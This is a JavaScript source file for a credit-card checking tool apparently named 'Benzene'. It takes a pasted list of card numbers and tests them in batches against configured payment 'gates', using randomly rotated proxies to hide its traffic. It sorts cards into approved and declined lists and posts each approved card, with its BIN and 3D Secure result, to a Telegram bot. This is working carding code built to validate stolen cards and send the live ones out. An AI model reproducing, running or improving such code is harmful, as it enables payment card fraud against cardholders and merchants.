import { config } from '../../appConfig.js';

/** Abort Controller Instance */
let controller = null;

/** Start Button Element */
const startButton = $('#start-button');

/** Start Button Click Handler */
startButton.click(async () => {
  /** If AppConfig Have No Gates */
  if (config.gates_data?.length === 0) {
    $('#statusQueue').text('Status: No Gates Found In AppConfig.');
    return;
  }

  /** Find api_path Using Which Gate Is Selected Inside `#gate-selector` */
  const gate = config.gates_data.find((gate) => gate.name === $('#gate-selector').val());

  if (!gate) {
    $('#statusQueue').text('Status: Gate Not Found In AppConfig.');
    return;
  }

  /** Re-Intialize Abort Controller */
  controller = new AbortController();
  const signal = controller.signal;

  /** Get Cards From TextArea */
  const textarea = $('#card-list-textarea');
  let cards = textarea.val()?.split('\n');

  /** Remove Empty Strings */
  cards = cards.filter((card) => card !== '');

  if (cards.length === 0) {
    $('#statusQueue').text('Status: Cards Are Empty.');
    return;
  }

  /** Update Textarea */
  textarea.val(cards.join('\n'));

  /** Remove Duplicate Cards */
  const uniqueCards = [...new Set(cards)];

  /** Update TotalCards Value In UI */
  $('.total-cards').text(uniqueCards.length.toString());

  /** Disable Start Button And Show Loading */
  startButton.disabled = true;
  startButton.addClass('btn-loading');

  /** Disable Textarea */
  textarea.attr('disabled', true);

  /** Display On Status Queue */
  $('#statusQueue').text('In Queue: Checking...');

  /** Batch Processing */
  const batchSize = 10;

  const cardBatches = [];
  for (let i = 0; i < uniqueCards.length; i += batchSize) {
    cardBatches.push(uniqueCards.slice(i, i + batchSize));
  }

  for (const cardBatch of cardBatches) {
    await Promise.allSettled(
      cardBatch.map(async (card) => {
        try {
          /** Get Random Proxy For ProxyList */
          const proxy = getRandomProxy();

          /** Ready Arguments */
          const args = {
            api_path: gate.api_path,
            card,
            proxy,
            gateName: gate.name,
            signal,
          };

          /** Make Req And Handle JSON */
          const result = await checkCard(args);

          /** Increment Checked Counter */
          $('.checked-count').text((parseInt($('.checked-count').text()) + 1).toString());

          /** Filter Checked Card From Textarea */
          const filteredTextarea = textarea
            .val()
            .split('\n')
            .filter((item) => item !== card);
          textarea.val(filteredTextarea.join('\n'));

          /** Handling Response */
          handleResponse(result);

          /** Send Message To Telegram */
          sendToTelegram(result);
        } catch (error) {
          if (error.message !== 'Aborted') console.error(error);
        } finally {
          if ($('.total-cards').text() === $('.checked-count').text() || controller.signal.aborted) {
            /** Remove From Queue */
            $('#statusQueue').text('Status: Idle...');

            /** Enable Textarea */
            textarea.attr('disabled', false);

            /** Enable Start Button And Hide Loading */
            startButton.disabled = false;
            startButton.removeClass('btn-loading');
          }
        }
      })
    );
  }
});

/** Check Card */
const checkCard = async ({ card, api_path, proxy, gateName, signal }) => {
  let result = null;

  try {
    const response = await fetch(`${api_path}?card=${card}${proxy ? `&proxy=${proxy}` : ''}&gateName=${gateName}`, {
      method: 'GET',
      headers: {
        accept: 'application/json',
      },
      signal,
    });
    result = await response.json();
  } catch (error) {
    if (signal?.aborted) {
      throw Error('Aborted');
    } else {
      result = {
        status: 'Declined',
        card,
        response: 'Returned Response Was Not Valid JSON.',
        binData: 'Error Occured While Making Request.',
      };
    }
  }

  return result;
};

/** Get Random Proxy */
const getRandomProxy = () => {
  /** Check if Proxy Toggle Is On */
  if ($('#proxy-toggle').is(':checked')) {
    /** Check If Proxies Exists In LocalStorage */
    if (!localStorage.getItem('proxies')) {
      $('#statusQueue').text('Status: Proxies Not Found.');
      return null;
    }
    /** Check If Proxies Are Not Empty */
    if (localStorage.getItem('proxies').split('\n').length === 0) {
      $('#statusQueue').text('Status: Proxies Are Empty.');
      return null;
    }

    /** Get Proxies From LocalStorage */
    const proxyList = localStorage.getItem('proxies')?.split('\n');
    return proxyList[Math.floor(Math.random() * proxyList.length)];
  }

  return null;
};

/** Handle Responses */
const handleResponse = (result) => {
  if (result.status == 'Approved') {
    /** Increment All Approved Counter */
    $('.approved-count').each((_, item) => {
      item.innerText = (parseInt(item.innerText) + 1).toString();
    });

    /** Append To Approved List */
    $('#approved-card-list').append(`
    <div class="flex flex-col approved-card">
        <span class="checked-card text-teal-600 font-bold">${result.card}</span>
        <span class="text-teal-600 font-bold">Res: <span
                class="response font-normal text-zinc-800 dark:text-white">${result.response}</span></span>
        <span class="text-teal-600 font-bold">3D Result:
            <span class="_3dresult font-normal text-zinc-800 dark:text-white">${result.threeDResult}</span></span>
        <span class="text-teal-600 font-bold">Bin:
            <span class="bin font-normal text-zinc-800 dark:text-white">${result.binData}</span></span>
        <span class="text-teal-600 font-bold">Gate: <span
                class="gate-name font-normal text-zinc-800 dark:text-white">${result.gateway}</span></span>
    </div><br>
    `);
  } else if (result.status == 'Approved-CCN') {
    /** Increment Approved Counter In Header */
    $('.approved-count')[0].innerText = (parseInt($('.approved-count')[0].innerText) + 1).toString();

    /** Increment All Approved Counter In CCN Card */
    $('.approved-ccn-count').each((_, item) => {
      item.innerText = (parseInt(item.innerText) + 1).toString();
    });

    /** Append To Approved-CCN List */
    $('#approved-ccn-card-list').append(`
    <div class="flex flex-col approved-ccn-card">
        <span class="checked-card text-emerald-600 font-bold">${result.card}</span>
        <span class="text-emerald-600 font-bold">Res: <span
                class="response font-normal text-zinc-800 dark:text-white">${result.response}</span></span>
        <span class="text-teal-600 font-bold">3D Result:
            <span class="_3dresult font-normal text-zinc-800 dark:text-white">${result.threeDResult}</span></span>
        <span class="text-emerald-600 font-bold">Bin:
            <span class="bin font-normal text-zinc-800 dark:text-white">${result.binData}</span></span>
        <span class="text-emerald-600 font-bold">Gate: <span
                class="gate-name font-normal text-zinc-800 dark:text-white">${result.gateway}</span></span>
    </div><br>
`);
  } else {
    /** Increment All Declined Counter */
    $('.declined-count').each((_, item) => {
      item.innerText = (parseInt(item.innerText) + 1).toString();
    });

    /** Append To Declined List */
    $('#declined-card-list').append(`
    <div class="flex flex-col declined-card">
        <span class="checked-card text-rose-600 font-bold">${result.card}</span>
        <span class="text-rose-600 font-bold">Res: <span
                class="response font-normal text-zinc-800 dark:text-white">${result.response}</span></span>
        <span class="text-rose-600 font-bold">Bin:
            <span class="bin font-normal text-zinc-800 dark:text-white">${result.binData}</span></span>
        <span class="text-rose-600 font-bold">Gate: <span
                class="gate-name font-normal text-zinc-800 dark:text-white">${result.gateway}</span>
        </span>
    </div><br>
    `);
  }
};

/** Send Card To Telegram
 * If Chat ID Exists
 * If TelegramBot Key Exists In Config
 * And If `result.status == 'Approved' || 'Approved-CCN'`
 */
const sendToTelegram = async (result) => {
  const chat_id = localStorage.getItem('chatId');
  const telegram_bot_key = localStorage.getItem('telegramBotToken');

  if (chat_id && telegram_bot_key && (result.status === 'Approved' || result.status === 'Approved-CCN')) {
    try {
      const message = `
𝘊𝘈𝘙𝘋  ❱❱ <code>${result.card}</code>
𝘚𝘛𝘈𝘛𝘜𝘚 ❱❱ ${result.status === 'Approved' || result.status === 'Approved-CCN' ? '✅' : '❌'} ${result.status}
3𝘋 𝘙𝘌𝘚𝘜𝘓𝘛 ❱❱ ${result.threeDResult ?? '-'}
𝘙𝘌𝘚𝘗𝘖𝘕𝘚𝘌 ❱❱ ${result.response}
𝘉𝘐𝘕  ❱❱ ${result.binData}
𝘎𝘈𝘛𝘌  ❱❱  ${result.gateway}
𝘍𝘙𝘖𝘔  ❱❱ __Benzene__`;

      /** Send Message */
      await fetch(`https://api.telegram.org/bot${telegram_bot_key}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id,
          text: message,
          parse_mode: 'HTML',
        }),
      });
    } catch (error) {
      console.log(`Error Occured While Sending Message To Telegram. ${error}`);
    }
  }
};

/** Stop Button Click Handler */
$('#stop-button').click(() => {
  /** Enable Button And Remove Button-Loading */
  startButton.disabled = false;
  startButton.removeClass('btn-loading');

  /** Abort All Ongoing Requests */
  controller.abort();
});
